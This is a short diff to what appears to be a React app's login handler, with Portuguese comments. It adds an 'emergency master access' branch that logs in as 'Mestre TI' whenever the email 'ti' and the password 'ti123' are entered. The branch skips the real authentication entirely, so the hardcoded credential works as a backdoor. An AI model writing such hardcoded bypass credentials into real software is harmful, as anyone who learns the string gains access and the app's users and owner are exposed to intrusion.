@@ -93,9 +93,18 @@ function App() {
     }
   };
 
-  // ================= LÓGICA DE LOGIN =================
+ // ================= LÓGICA DE LOGIN =================
   const handleLogin = async (e) => {
     e.preventDefault();
+    
+    // ACESSO MESTRE DE EMERGÊNCIA (O retorno do Jedi)
+    if (credenciais.email === 'ti' && credenciais.senha === 'ti123') {
+      setUsuarioLogado({ nome: 'Mestre TI', email: 'ti@biscoite.com.br' });
+      setErroLogin('');
+      setCredenciais({ email: '', senha: '' });
+      return;
+    }
+
     setCarregandoLogin(true);
     setErroLogin('');
     setSucessoLogin('');
